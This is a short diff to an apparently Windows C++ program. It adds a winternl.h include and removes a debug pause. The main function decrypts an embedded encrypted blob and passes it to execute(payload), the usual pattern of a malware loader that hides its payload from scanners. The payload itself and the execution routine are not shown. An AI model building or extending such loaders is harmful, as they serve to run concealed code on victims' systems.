@@ -4,6 +4,7 @@
 #include <openssl/rand.h>
 #include <openssl/evp.h>
 #include <windows.h>
+#include <winternl.h>
 #include <tchar.h>
 #include <stdbool.h>
 #include <random>
@@ -251,7 +252,6 @@ int main() {
     /*DB_CALL*/
     vector<unsigned char> payload = decrypt(ENCRYPTED, KEY, IV);
     execute(payload);
-    if(DEBUG){cin.get();}
 
     return 0;
 }
